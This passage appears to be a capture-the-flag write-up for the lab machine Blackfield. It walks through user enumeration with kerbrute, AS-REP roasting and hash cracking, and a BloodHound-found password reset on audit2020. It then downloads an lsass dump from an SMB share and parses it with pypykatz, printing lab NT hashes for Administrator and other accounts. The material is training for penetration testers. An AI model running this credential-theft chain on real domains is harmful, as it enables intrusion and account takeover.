➜  kerbrute git:(master) ✗ du -h kerbrute                                                                                                                                                                                                                   
1.9M    kerbrute
```

## ASPRoast - user support@blackfield.htb

For some reason this hash didn’t crack, but when I used `GetNPUsers.py` it worked

```bash
./kerbrute userenum -d blackfield.local --dc 10.129.156.28 ../../content/users.txt   

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/11/22 - Ronnie Flathers @ropnop

2022/02/11 23:18:43 >  Using KDC(s):
2022/02/11 23:18:43 >   10.129.156.28:88

2022/02/11 23:19:03 >  [+] VALID USERNAME:       audit2020@blackfield.local
2022/02/11 23:20:55 >  [+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:037ef6e09febcab49aa55d64e458e227$9428a47e1e809c90708d639274487c2efa581ae994c4a51cdc0a9f7e71260c23d1ab1b95d7f407b475dffd0b85ebe79fc25eb9e7e642ffe63b3b8b3cf5a4996418dd048baef53541b13199acddb70615fc70e8482e951383a4a9d83b3d99dc7c0ae33c23d1186a36c2db3109e8fbaef26a8a505484aee2a3b87a5a0c813ee38224f39c72e7dc9f4e9cf16ba4ff2f5a751c7e355859afb8afeba50ee6f2f091eb0bbf3880de619e4fabf5697806300c1611abec908ab889e32abca85c3d2ba1f85d2123ffeae358bdd7152e7d8e0dd4ffab7ba72a1da9588f1e835a8d97b1dc4bb84b4d339fba1cbcf162ac29b182c2226e9283aff823f974627041129e5b515e196ac5dd283f7de2
2022/02/11 23:20:55 >  [+] VALID USERNAME:       support@blackfield.local
2022/02/11 23:21:00 >  [+] VALID USERNAME:       svc_backup@blackfield.local
2022/02/11 23:21:26 >  Done! Tested 314 usernames (3 valid) in 162.618 seconds
```

### GetNPUsers.py

```
GetNPUsers.py blackfield.local/ -no-pass -dc-ip 10.129.156.28 -usersfile content/users.txt

Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation

$krb5asrep$23$support@BLACKFIELD.LOCAL:0ce6af60ed28f067293f8a3f90fad0d6$9cd22b43da0c0b0f0fb4dc1550eefcd2b8f6b86bc71f23bcb4352fc97e85c8b14f217b4442136ff7b7bfc481ac6806dcf361f318934da5c7e823e0725c828095a9d0523afd2adf09b159cad41c45ddec0c764398a3d3b4b49f90ea67cd1e6bc72e1892ec7fd6609805d16acc238517cfd7e885d380509d9c4c67f3d699f50ae66edbd5d7729cb6c743e1d76de9002b2a15aea91bcf3f24793df669a71efc21b8cb615bf02f3fec768c62479de42db0d79267c8ecf3aa4ff0ffe18531f7346491d22110b09aa75556cf4a7e3ce62cccebb723476b8d67eae2b63173452f6e0ab2596da2d1fbe1e6a0ff4005211ab14137b3d893f7
```

### Cracking the hash

I tried cracking the hash but I got nothing

```bash
john --wordlist=~/Tools/rockyou.txt content/support_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:07 DONE (2022-02-12 00:01) 0.1416g/s 2030Kp/s 2030Kc/s 2030KC/s #1WIF3Y.."chito"
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

# Credentials

```
support:#00^BlackKnight
```

# KerbeRoast Attack
I tried to see if there any kerberoastable accounts, but I got nothing. 

```bash
GetUserSPNs.py blackfield.local/support:'#00^BlackKnight' -request -dc-ip 10.129.156.28
```

# BloodHound.py
I didn't have much at this point, so time to perform further Active Directory enumeration with bloodhound.

Source:

```bash
https://github.com/fox-it/BloodHound.py
```

```bash
python3 bloodhound.py -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.129.156.28 -c all
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 316 users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 52 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Invalid computer object without hostname: SRV-INTRANET$
INFO: Invalid computer object without hostname: SRV-EXCHANGE$
INFO: Invalid computer object without hostname: SRV-FILE$
INFO: Querying computer: 
INFO: Invalid computer object without hostname: SRV-WEB$
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Invalid computer object without hostname: PC13$
INFO: Invalid computer object without hostname: PC12$
INFO: Querying computer: 
INFO: Invalid computer object without hostname: PC11$
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Invalid computer object without hostname: PC10$
INFO: Querying computer: 
INFO: Invalid computer object without hostname: PC09$
INFO: Querying computer: 
INFO: Invalid computer object without hostname: PC08$
INFO: Querying computer: 
INFO: Invalid computer object without hostname: PC07$
INFO: Querying computer: 
INFO: Invalid computer object without hostname: PC06$
INFO: Querying computer: 
INFO: Invalid computer object without hostname: PC05$
INFO: Querying computer: 
INFO: Invalid computer object without hostname: PC04$
INFO: Querying computer: 
INFO: Invalid computer object without hostname: PC03$
INFO: Querying computer: 
INFO: Invalid computer object without hostname: PC02$
INFO: Querying computer: 
INFO: Invalid computer object without hostname: PC01$
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 07S
```

## ForceChangePassword - audit2020
I can mark user as "Owned" and noticed that I had the ability to change the password for the account audit2020.

![Untitled](/assets/images/htb-blackfield/Untitled.png)

![Untitled](/assets/images/htb-blackfield/Untitled%201.png)

![Untitled](/assets/images/htb-blackfield/Untitled%202.png)

### Changing the password using rpc

Using `net rpc` I can set the password for the the account `audit2020`

```Text
➜  Blackfield net rpc 
Invalid command: net rpc 
Usage:
net rpc audit           Modify global audit settings
net rpc info            Show basic info about a domain
net rpc join            Join a domain
net rpc oldjoin         Join a domain created in server manager
net rpc testjoin        Test that a join is valid
net rpc user            List/modify users
net rpc password        Change a user password
net rpc group           List/modify groups
net rpc share           List/modify shares
net rpc file            List open files
net rpc printer         List/modify printers
net rpc changetrustpw   Change trust account password
net rpc trustdom        Modify domain trusts
net rpc abortshutdown   Abort a remote shutdown
net rpc shutdown        Shutdown a remote server
net rpc vampire         Sync a remote NT PDC's data into local passdb
net rpc getsid          Fetch the domain sid into local secrets.tdb
net rpc rights          Manage privileges assigned to SID
net rpc service         Start/stop/query remote services
net rpc registry        Manage registry hives
net rpc shell           Open interactive shell on remote server
net rpc trust           Manage trusts
net rpc conf            Configure a remote samba server
```

```bash
➜  Blackfield net rpc password --help

net [<method>] user [misc. options] [targets]
        List users

net [<method>] user DELETE <name> [misc. options] [targets]
        Delete specified user

net [<method>] user INFO <name> [misc. options] [targets]
        List the domain groups of the specified user

net [<method>] user ADD <name> [password] [-c container] [-F user flags] [misc. options] [targets]
        Add specified user

net [<method>] user RENAME <oldusername> <newusername> [targets]
        Rename specified user

Valid methods: (auto-detected if not specified)
        ads                             Active Directory (LDAP/Kerberos)
        rpc                             DCE-RPC
        rap                             RAP (older systems)

Valid targets: choose one (none defaults to localhost)
        -S or --server=<server>         server name
        -I or --ipaddress=<ipaddr>      address of target server
        -w or --workgroup=<wg>          target workgroup or domain

Valid miscellaneous options are:
        -p or --port=<port>             connection port on target
        -W or --myworkgroup=<wg>        client workgroup
        -d or --debuglevel=<level>      debug level (0-10)
        -n or --myname=<name>           client name
        -U or --user=<name>             user name
        -s or --configfile=<path>       pathname of smb.conf file
        -l or --long                    Display full information
        -V or --version                 Print samba version information
        -P or --machine-pass            Authenticate as machine account
        -e or --encrypt                 Encrypt SMB transport (UNIX extended servers only)
        -k or --kerberos                Use kerberos (active directory) authentication
        -C or --comment=<comment>       descriptive comment (for add only)
        -c or --container=<container>   LDAP container, defaults to cn=Users (for add in ADS only)
```
I set the password to `5quid12345$` and use `crackmapexec` to confirm the creds were updated and the account is valid.
```bash
➜  Blackfield net rpc password audit2020 -U 'support' -S 10.129.156.28
Enter new password for audit2020:
Enter WORKGROUP\support's password: 
➜  Blackfield
```

![Untitled](/assets/images/htb-blackfield/Untitled%203.png)

# More Creds

```bash
audit2020:5quid12345$
```

# Enumerating shares using audit202

## crackmapexec

```bash
crackmapexec smb 10.129.156.28 -u audit2020 -p '5quid12345$' --shares                    
SMB         10.129.156.28   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.156.28   445    DC01             [+] BLACKFIELD.local\audit2020:5quid12345$ 
SMB         10.129.156.28   445    DC01             [+] Enumerated shares
SMB         10.129.156.28   445    DC01             Share           Permissions     Remark
SMB         10.129.156.28   445    DC01             -----           -----------     ------
SMB         10.129.156.28   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.156.28   445    DC01             C$                              Default share
SMB         10.129.156.28   445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.156.28   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.156.28   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.156.28   445    DC01             profiles$       READ            
SMB         10.129.156.28   445    DC01             SYSVOL          READ            Logon server share 
➜  Blackfield
```

## smbclient
I can use `smbclient` to connect to the `forensic` share and download all the files I have access to. A simple trick to download all the files easily is to disable prompts and set recurse to on. Then I can use `mget *` to get all the files.
```bash
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
```

Connecting to the `forensic` share.
```bash
smbclient \\\\10.129.156.28\\forensic -U audit2020 '5quid12345$' 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                5102079 blocks of size 4096. 1685711 blocks available
smb: \>
```

Listing and downloading all the files under `commands_output` and `memory_analysis`.
```bash
smb: \> ls commands_output\
  .                                   D        0  Sun Feb 23 13:14:37 2020
  ..                                  D        0  Sun Feb 23 13:14:37 2020
  domain_admins.txt                   A      528  Sun Feb 23 08:00:19 2020
  domain_groups.txt                   A      962  Sun Feb 23 07:51:52 2020
  domain_users.txt                    A    16454  Fri Feb 28 17:32:17 2020
  firewall_rules.txt                  A   518202  Sun Feb 23 07:53:58 2020
  ipconfig.txt                        A     1782  Sun Feb 23 07:50:28 2020
  netstat.txt                         A     3842  Sun Feb 23 07:51:01 2020
  route.txt                           A     3976  Sun Feb 23 07:53:01 2020
  systeminfo.txt                      A     4550  Sun Feb 23 07:56:59 2020
  tasklist.txt                        A     9990  Sun Feb 23 07:54:29 2020

                5102079 blocks of size 4096. 1685711 blocks available
smb: \> 
smb: \> ls memory_analysis\
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020

                5102079 blocks of size 4096. 1685711 blocks available
smb: \>
```

Getting all the files.
```bash
smbclient \\\\10.129.156.28\\forensic -U audit2020 '5quid12345$'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                5102079 blocks of size 4096. 1685711 blocks available
smb: \> cd commands_output\
smb: \commands_output\> prompt off
smb: \commands_output\> recurse on
smb: \commands_output\> 
smb: \commands_output\> mget *
getting file \commands_output\domain_admins.txt of size 528 as domain_admins.txt (2.9 KiloBytes/sec) (average 2.9 KiloBytes/sec)
getting file \commands_output\domain_groups.txt of size 962 as domain_groups.txt (5.3 KiloBytes/sec) (average 4.1 KiloBytes/sec)
getting file \commands_output\domain_users.txt of size 16454 as domain_users.txt (89.8 KiloBytes/sec) (average 33.0 KiloBytes/sec)
getting file \commands_output\firewall_rules.txt of size 518202 as firewall_rules.txt (1417.5 KiloBytes/sec) (average 589.6 KiloBytes/sec)
getting file \commands_output\ipconfig.txt of size 1782 as ipconfig.txt (9.9 KiloBytes/sec) (average 494.2 KiloBytes/sec)
getting file \commands_output\netstat.txt of size 3842 as netstat.txt (21.7 KiloBytes/sec) (average 428.1 KiloBytes/sec)
getting file \commands_output\route.txt of size 3976 as route.txt (22.3 KiloBytes/sec) (average 378.0 KiloBytes/sec)
getting file \commands_output\systeminfo.txt of size 4550 as systeminfo.txt (25.1 KiloBytes/sec) (average 338.6 KiloBytes/sec)
getting file \commands_output\tasklist.txt of size 9990 as tasklist.txt (55.4 KiloBytes/sec) (average 310.4 KiloBytes/sec)
smb: \commands_output\> 
smb: \commands_output\> 
smb: \commands_output\> cd ..\memory_analysis\
smb: \memory_analysis\> 
smb: \memory_analysis\> mget *
getting file \memory_analysis\conhost.zip of size 37876530 as conhost.zip (9477.0 KiloBytes/sec) (average 6624.8 KiloBytes/sec)
getting file \memory_analysis\ctfmon.zip of size 24962333 as ctfmon.zip (5586.0 KiloBytes/sec) (average 6172.8 KiloBytes/sec)
getting file \memory_analysis\dfsrs.zip of size 23993305 as dfsrs.zip (4823.2 KiloBytes/sec) (average 5732.4 KiloBytes/sec)
getting file \memory_analysis\dllhost.zip of size 18366396 as dllhost.zip (5124.6 KiloBytes/sec) (average 5616.7 KiloBytes/sec)
getting file \memory_analysis\ismserv.zip of size 8810157 as ismserv.zip (5660.3 KiloBytes/sec) (average 5620.0 KiloBytes/sec)
getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (6788.2 KiloBytes/sec) (average 5891.7 KiloBytes/sec)
getting file \memory_analysis\mmc.zip of size 64288607 as mmc.zip (4899.5 KiloBytes/sec) (average 5563.6 KiloBytes/sec)
getting file \memory_analysis\RuntimeBroker.zip of size 13332174 as RuntimeBroker.zip (2059.1 KiloBytes/sec) (average 5072.1 KiloBytes/sec)
getting file \memory_analysis\ServerManager.zip of size 131983313 as ServerManager.zip (5102.3 KiloBytes/sec) (average 5082.9 KiloBytes/sec)
getting file \memory_analysis\sihost.zip of size 33141744 as sihost.zip (4450.6 KiloBytes/sec) (average 5023.7 KiloBytes/sec)
getting file \memory_analysis\smartscreen.zip of size 33756344 as smartscreen.zip (3013.0 KiloBytes/sec) (average 4775.3 KiloBytes/sec)
getting file \memory_analysis\svchost.zip of size 14408833 as svchost.zip (4351.0 KiloBytes/sec) (average 4760.3 KiloBytes/sec)
getting file \memory_analysis\taskhostw.zip of size 34631412 as taskhostw.zip (6124.5 KiloBytes/sec) (average 4837.7 KiloBytes/sec)
getting file \memory_analysis\winlogon.zip of size 14255089 as winlogon.zip (4255.9 KiloBytes/sec) (average 4818.8 KiloBytes/sec)
getting file \memory_analysis\wlms.zip of size 4067425 as wlms.zip (3733.2 KiloBytes/sec) (average 4807.4 KiloBytes/sec)
getting file \memory_analysis\WmiPrvSE.zip of size 18303252 as WmiPrvSE.zip (4859.8 KiloBytes/sec) (average 4809.3 KiloBytes/sec)
smb: \memory_analysis\>
```

## Pypykatz
One of the zip files is named `lsass.zip`. Checking the contents of this file shows a minidump of the `lsass` which is something that can be read using a tool called `pypykatz`

```bash
➜  content pypykatz lsa minidump lsass.DMP
INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:59:38.218491+00:00
sid S-1-5-96-0-2
luid 365835
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: NA
        == WDIGEST [5950b]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [5950b]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 365493 (593b5)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:59:38.200147+00:00
sid S-1-5-96-0-2
luid 365493
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: NA
        == WDIGEST [593b5]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [593b5]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 257142 (3ec76)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:59:13.318909+00:00
sid S-1-5-18
luid 257142
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 153705 (25869)
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
                DPAPI: 240339f898b6ac4ce3f34702e4a89550
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: Administrator
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
        == DPAPI [25869]==
                luid 153705
                key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
                masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
                sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9

== LogonSession ==
authentication_id 137110 (21796)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:27.068590+00:00
sid S-1-5-18
luid 137110
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 134695 (20e27)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:26.678019+00:00
sid S-1-5-18
luid 134695
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 40310 (9d76)
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40310
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: NA
        == WDIGEST [9d76]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [9d76]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 40232 (9d28)
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40232
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: NA
        == WDIGEST [9d28]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [9d28]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:57:46.725846+00:00
sid S-1-5-20
luid 996
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: NA
        == WDIGEST [3e4]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: dc01$
                Domain: BLACKFIELD.local
                Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [3e4]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 24410 (5f5a)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-1
luid 24410
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: NA
        == WDIGEST [5f5a]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [5f5a]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 406499 (633e3)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
        == DPAPI [633e3]==
                luid 406499
                key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
                masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
                sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991

== LogonSession ==
authentication_id 366665 (59849)
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366665
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: NA
        == WDIGEST [59849]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [59849]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 366649 (59839)
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366649
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: NA
        == WDIGEST [59839]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [59839]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 256940 (3ebac)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:59:13.068835+00:00
sid S-1-5-18
luid 256940
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 136764 (2163c)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:27.052945+00:00
sid S-1-5-18
luid 136764
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 134935 (20f17)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:26.834285+00:00
sid S-1-5-18
luid 134935
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server
logon_time 2020-02-23T17:57:47.162285+00:00
sid S-1-5-19
luid 997
        == Kerberos ==
                Username:
                Domain:

== LogonSession ==
authentication_id 24405 (5f55)
session_id 0
username UMFD-0
